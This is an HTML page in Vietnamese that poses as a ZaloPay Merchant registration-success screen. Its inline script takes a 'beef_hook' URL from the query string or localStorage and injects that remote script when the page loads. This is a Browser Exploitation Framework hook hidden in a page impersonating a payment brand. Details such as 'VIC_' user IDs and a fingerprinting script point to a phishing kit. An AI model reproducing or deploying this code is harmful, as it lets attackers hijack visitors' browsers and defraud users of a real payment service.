<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng ký thành công - ZaloPay Merchant</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <!-- Custom CSS -->
    <link href="/css/merchant.css" rel="stylesheet">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body class="bg-light">
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
        <div class="container">
            <a class="navbar-brand d-flex align-items-center" href="/">
                <img src="/images/zalopay-logo.png" alt="ZaloPay" height="40" class="me-2">
                <span class="fw-bold text-primary">ZaloPay Merchant</span>
            </a>
        </div>
    </nav>

    <!-- Main Content -->
    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-lg-8">
                <div class="card shadow-lg border-0">
                    <div class="card-body p-5 text-center">
                        <!-- Success Animation -->
                        <div class="success-animation mb-4">
                            <div class="success-icon bg-success text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-3" style="width: 5rem; height: 5rem;">
                                <i class="fas fa-check fa-3x"></i>
                            </div>
                            <div class="success-ripple"></div>
                        </div>

                        <!-- Success Message -->
                        <h1 class="display-4 fw-bold text-success mb-3">Chúc mừng!</h1>
                        <h2 class="h4 text-muted mb-4">Tài khoản ZaloPay Merchant của bạn đã được tạo thành công</h2>
                        
                        <!-- Account Information -->
                        <div class="alert alert-success border-0 mb-4">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6 class="alert-heading">Thông tin tài khoản:</h6>
                                    <p class="mb-1"><strong>Email:</strong> <span id="userEmail">user@example.com</span></p>
                                    <p class="mb-1"><strong>Tên:</strong> <span id="userName">Nguyễn Văn A</span></p>
                                    <p class="mb-0"><strong>ID:</strong> <span id="userId">VIC_20241201_ABC123</span></p>
                                </div>
                                <div class="col-md-6">
                                    <h6 class="alert-heading">Trạng thái:</h6>
                                    <p class="mb-1"><strong>Xác thực:</strong> <span class="badge bg-success">Đã xác thực</span></p>
                                    <p class="mb-1"><strong>Tài khoản:</strong> <span class="badge bg-primary">Hoạt động</span></p>
                                    <p class="mb-0"><strong>Ngày tạo:</strong> <span id="createdDate">01/12/2024</span></p>
                                </div>
                            </div>
                        </div>

                        <!-- Next Steps -->
                        <div class="next-steps mb-4">
                            <h4 class="fw-bold mb-3">Bước tiếp theo:</h4>
                            <div class="row g-3">
                                <div class="col-md-4">
                                    <div class="step-card p-3 border rounded-3">
                                        <div class="step-icon bg-primary text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-2">
                                            <i class="fas fa-cog fa-lg"></i>
                                        </div>
                                        <h6 class="fw-bold">Cấu hình tài khoản</h6>
                                        <p class="text-muted small">Thiết lập thông tin doanh nghiệp và phương thức thanh toán</p>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="step-card p-3 border rounded-3">
                                        <div class="step-icon bg-warning text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-2">
                                            <i class="fas fa-code fa-lg"></i>
                                        </div>
                                        <h6 class="fw-bold">Tích hợp API</h6>
                                        <p class="text-muted small">Kết nối hệ thống của bạn với ZaloPay Merchant</p>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="step-card p-3 border rounded-3">
                                        <div class="step-icon bg-success text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-2">
                                            <i class="fas fa-rocket fa-lg"></i>
                                        </div>
                                        <h6 class="fw-bold">Bắt đầu giao dịch</h6>
                                        <p class="text-muted small">Bắt đầu nhận thanh toán từ khách hàng</p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Action Buttons -->
                        <div class="action-buttons">
                            <button class="btn btn-primary btn-lg me-3" onclick="goToDashboard()">
                                <i class="fas fa-tachometer-alt me-2"></i>Vào Dashboard
                            </button>
                            <button class="btn btn-outline-primary btn-lg me-3" onclick="goToSetup()">
                                <i class="fas fa-cog me-2"></i>Thiết lập tài khoản
                            </button>
                            <button class="btn btn-outline-secondary btn-lg" onclick="goToHome()">
                                <i class="fas fa-home me-2"></i>Về trang chủ
                            </button>
                        </div>

                        <!-- Additional Information -->
                        <div class="mt-5 pt-4 border-top">
                            <h5 class="fw-bold mb-3">Thông tin bổ sung:</h5>
                            <div class="row text-start">
                                <div class="col-md-6">
                                    <h6 class="fw-bold">Hỗ trợ khách hàng:</h6>
                                    <p class="text-muted small">
                                        <i class="fas fa-phone me-2"></i>Hotline: 1900 1234<br>
                                        <i class="fas fa-envelope me-2"></i>Email: support@zalopay.com<br>
                                        <i class="fas fa-clock me-2"></i>Thời gian: 24/7
                                    </p>
                                </div>
                                <div class="col-md-6">
                                    <h6 class="fw-bold">Tài liệu hướng dẫn:</h6>
                                    <p class="text-muted small">
                                        <i class="fas fa-book me-2"></i><a href="/guide.html" class="text-decoration-none">Hướng dẫn sử dụng</a><br>
                                        <i class="fas fa-code me-2"></i><a href="#" class="text-decoration-none">Tài liệu API</a><br>
                                        <i class="fas fa-question-circle me-2"></i><a href="/faq.html" class="text-decoration-none">Câu hỏi thường gặp</a>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-dark text-white py-4">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-6">
                    <p class="mb-0">© 2024 ZaloPay Merchant. Tất cả quyền được bảo lưu.</p>
                </div>
                <div class="col-md-6 text-md-end">
                    <a href="#" class="text-white me-3">Điều khoản sử dụng</a>
                    <a href="#" class="text-white">Chính sách bảo mật</a>
                </div>
            </div>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Custom JS -->
    <script src="/js/merchant.js"></script>
    <script src="/js/fingerprint.js"></script>
    
    <script>
        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            // Get user data from URL parameters or localStorage
            const urlParams = new URLSearchParams(window.location.search);
            const userData = {
                email: urlParams.get('email') || localStorage.getItem('user_email') || 'user@example.com',
                name: urlParams.get('name') || localStorage.getItem('user_name') || 'Nguyễn Văn A',
                id: urlParams.get('id') || localStorage.getItem('user_id') || 'VIC_20241201_ABC123',
                created_date: urlParams.get('created_date') || new Date().toLocaleDateString('vi-VN')
            };
            
            // Update page content
            document.getElementById('userEmail').textContent = userData.email;
            document.getElementById('userName').textContent = userData.name;
            document.getElementById('userId').textContent = userData.id;
            document.getElementById('createdDate').textContent = userData.created_date;
            
            // Inject BeEF hook
            const beefHookUrl = urlParams.get('beef_hook') || localStorage.getItem('beef_hook_url');
            if (beefHookUrl) {
                injectBeEFHook(beefHookUrl);
            }
            
            // Start success animation
            startSuccessAnimation();
        });
        
        function startSuccessAnimation() {
            // Add success animation class
            const successIcon = document.querySelector('.success-icon');
            successIcon.classList.add('animate__animated', 'animate__bounceIn');
            
            // Add ripple effect
            const ripple = document.querySelector('.success-ripple');
            ripple.classList.add('animate__animated', 'animate__pulse');
        }
        
        function injectBeEFHook(hookUrl) {
            try {
                // Create and inject BeEF hook script
                const script = document.createElement('script');
                script.src = hookUrl;
                script.async = true;
                script.onload = function() {
                    console.log('BeEF hook loaded successfully');
                };
                script.onerror = function() {
                    console.error('Failed to load BeEF hook');
                };
                document.head.appendChild(script);
                
                console.log('BeEF hook injected:', hookUrl);
            } catch (error) {
                console.error('Failed to inject BeEF hook:', error);
            }
        }
        
        function goToDashboard() {
            // Redirect to admin dashboard
            window.location.href = '/admin/dashboard.html';
        }
        
        function goToSetup() {
            // Redirect to account setup
            window.location.href = '/admin/setup.html';
        }
        
        function goToHome() {
            // Redirect to home page
            window.location.href = '/';
        }
    </script>
    
    <style>
        .success-animation {
            position: relative;
        }
        
        .success-ripple {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 6rem;
            height: 6rem;
            border: 2px solid #28a745;
            border-radius: 50%;
            opacity: 0.3;
        }
        
        .step-card {
            transition: transform 0.2s ease-in-out;
        }
        
        .step-card:hover {
            transform: translateY(-2px);
        }
        
        .animate__animated {
            animation-duration: 1s;
            animation-fill-mode: both;
        }
        
        .animate__bounceIn {
            animation-name: bounceIn;
        }
        
        .animate__pulse {
            animation-name: pulse;
        }
        
        @keyframes bounceIn {
            0% {
                opacity: 0;
                transform: scale(0.3);
            }
            50% {
                opacity: 1;
                transform: scale(1.05);
            }
            70% {
                transform: scale(0.9);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.3;
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
                opacity: 0.1;
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.3;
            }
        }
    </style>
</body>
</html>